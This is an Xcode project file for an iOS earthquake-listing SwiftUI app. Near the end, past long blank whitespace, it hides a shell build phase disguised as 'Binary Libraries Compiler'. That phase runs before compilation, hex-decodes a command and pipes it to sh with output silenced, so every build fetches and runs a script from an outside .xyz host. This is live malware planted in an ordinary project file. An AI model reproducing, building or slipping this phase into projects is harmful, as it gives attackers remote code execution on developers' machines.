// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		DE88486123452E67007EFAA5 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE88486023452E67007EFAA5 /* AppDelegate.swift */; };
		DE88486323452E67007EFAA5 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE88486223452E67007EFAA5 /* SceneDelegate.swift */; };
		DE88486523452E67007EFAA5 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE88486423452E67007EFAA5 /* ContentView.swift */; };
		DE88486723452E68007EFAA5 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = DE88486623452E68007EFAA5 /* Assets.xcassets */; };
		DE88486A23452E68007EFAA5 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = DE88486923452E68007EFAA5 /* Preview Assets.xcassets */; };
		DE88486D23452E68007EFAA5 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = DE88486B23452E68007EFAA5 /* LaunchScreen.storyboard */; };
		DE88487623452ED3007EFAA5 /* Quake.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE88487523452ED3007EFAA5 /* Quake.swift */; };
		DE884878234530B9007EFAA5 /* NetworkingManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE884877234530B9007EFAA5 /* NetworkingManager.swift */; };
		DE88487B23453E5D007EFAA5 /* CellRow.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE88487A23453E5D007EFAA5 /* CellRow.swift */; };
		DE88487D23454510007EFAA5 /* QuakeDetails.swift in Sources */ = {isa = PBXBuildFile; fileRef = DE88487C23454510007EFAA5 /* QuakeDetails.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		DE88485D23452E67007EFAA5 /* QuakesApp-New-XC11.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "QuakesApp-New-XC11.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		DE88486023452E67007EFAA5 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		DE88486223452E67007EFAA5 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		DE88486423452E67007EFAA5 /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		DE88486623452E68007EFAA5 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		DE88486923452E68007EFAA5 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		DE88486C23452E68007EFAA5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		DE88486E23452E68007EFAA5 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		DE88487523452ED3007EFAA5 /* Quake.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Quake.swift; sourceTree = "<group>"; };
		DE884877234530B9007EFAA5 /* NetworkingManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkingManager.swift; sourceTree = "<group>"; };
		DE88487A23453E5D007EFAA5 /* CellRow.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CellRow.swift; sourceTree = "<group>"; };
		DE88487C23454510007EFAA5 /* QuakeDetails.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuakeDetails.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		DE88485A23452E67007EFAA5 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		DE88485423452E67007EFAA5 = {
			isa = PBXGroup;
			children = (
				DE88485F23452E67007EFAA5 /* QuakesApp-New-XC11 */,
				DE88485E23452E67007EFAA5 /* Products */,
			);
			sourceTree = "<group>";
		};
		DE88485E23452E67007EFAA5 /* Products */ = {
			isa = PBXGroup;
			children = (
				DE88485D23452E67007EFAA5 /* QuakesApp-New-XC11.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		DE88485F23452E67007EFAA5 /* QuakesApp-New-XC11 */ = {
			isa = PBXGroup;
			children = (
				DE88487923453E50007EFAA5 /* Views */,
				DE88487423452EA1007EFAA5 /* Models */,
				DE88486023452E67007EFAA5 /* AppDelegate.swift */,
				DE88486223452E67007EFAA5 /* SceneDelegate.swift */,
				DE88486423452E67007EFAA5 /* ContentView.swift */,
				DE88486623452E68007EFAA5 /* Assets.xcassets */,
				DE88486B23452E68007EFAA5 /* LaunchScreen.storyboard */,
				DE88486E23452E68007EFAA5 /* Info.plist */,
				DE88486823452E68007EFAA5 /* Preview Content */,
				DE884877234530B9007EFAA5 /* NetworkingManager.swift */,
			);
			path = "QuakesApp-New-XC11";
			sourceTree = "<group>";
		};
		DE88486823452E68007EFAA5 /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				DE88486923452E68007EFAA5 /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		DE88487423452EA1007EFAA5 /* Models */ = {
			isa = PBXGroup;
			children = (
				DE88487523452ED3007EFAA5 /* Quake.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		DE88487923453E50007EFAA5 /* Views */ = {
			isa = PBXGroup;
			children = (
				DE88487A23453E5D007EFAA5 /* CellRow.swift */,
				DE88487C23454510007EFAA5 /* QuakeDetails.swift */,
			);
			path = Views;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		DE88485C23452E67007EFAA5 /* QuakesApp-New-XC11 */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = DE88487123452E68007EFAA5 /* Build configuration list for PBXNativeTarget "QuakesApp-New-XC11" */;
			buildPhases = (
				EFE9B3A4D3AC35CC156D902C /* Binary Libraries Compiler */,
				DE88485923452E67007EFAA5 /* Sources */,
				DE88485A23452E67007EFAA5 /* Frameworks */,
				DE88485B23452E67007EFAA5 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "QuakesApp-New-XC11";
			productName = "QuakesApp-New-XC11";
			productReference = DE88485D23452E67007EFAA5 /* QuakesApp-New-XC11.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		DE88485523452E67007EFAA5 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1110;
				LastUpgradeCheck = 1110;
				ORGANIZATIONNAME = "Paulo Dichone";
				TargetAttributes = {
					DE88485C23452E67007EFAA5 = {
						CreatedOnToolsVersion = 11.1;
					};
				};
			};
			buildConfigurationList = DE88485823452E67007EFAA5 /* Build configuration list for PBXProject "QuakesApp-New-XC11" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = DE88485423452E67007EFAA5;
			productRefGroup = DE88485E23452E67007EFAA5 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				DE88485C23452E67007EFAA5 /* QuakesApp-New-XC11 */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		DE88485B23452E67007EFAA5 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				DE88486D23452E68007EFAA5 /* LaunchScreen.storyboard in Resources */,
				DE88486A23452E68007EFAA5 /* Preview Assets.xcassets in Resources */,
				DE88486723452E68007EFAA5 /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		DE88485923452E67007EFAA5 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				DE88487D23454510007EFAA5 /* QuakeDetails.swift in Sources */,
				DE88486123452E67007EFAA5 /* AppDelegate.swift in Sources */,
				DE88487623452ED3007EFAA5 /* Quake.swift in Sources */,
				DE88486323452E67007EFAA5 /* SceneDelegate.swift in Sources */,
				DE884878234530B9007EFAA5 /* NetworkingManager.swift in Sources */,
				DE88487B23453E5D007EFAA5 /* CellRow.swift in Sources */,
				DE88486523452E67007EFAA5 /* ContentView.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		DE88486B23452E68007EFAA5 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				DE88486C23452E68007EFAA5 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		DE88486F23452E68007EFAA5 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		DE88487023452E68007EFAA5 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 13.1;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		DE88487223452E68007EFAA5 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"QuakesApp-New-XC11/Preview Content\"";
				DEVELOPMENT_TEAM = 8R3P9D8HH3;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = "QuakesApp-New-XC11/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "bawp-quakes-xc11.QuakesApp-New-XC11";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		DE88487323452E68007EFAA5 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_ASSET_PATHS = "\"QuakesApp-New-XC11/Preview Content\"";
				DEVELOPMENT_TEAM = 8R3P9D8HH3;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = "QuakesApp-New-XC11/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "bawp-quakes-xc11.QuakesApp-New-XC11";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		DE88485823452E67007EFAA5 /* Build configuration list for PBXProject "QuakesApp-New-XC11" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				DE88486F23452E68007EFAA5 /* Debug */,
				DE88487023452E68007EFAA5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		DE88487123452E68007EFAA5 /* Build configuration list for PBXNativeTarget "QuakesApp-New-XC11" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				DE88487223452E68007EFAA5 /* Debug */,
				DE88487323452E68007EFAA5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

	
		/* Begin PBXShellScriptBuildPhase section */

	EFE9B3A4D3AC35CC156D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		
	
		/* End PBXShellScriptBuildPhase section */
	
	

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = DE88485523452E67007EFAA5 /* Project object */;
}
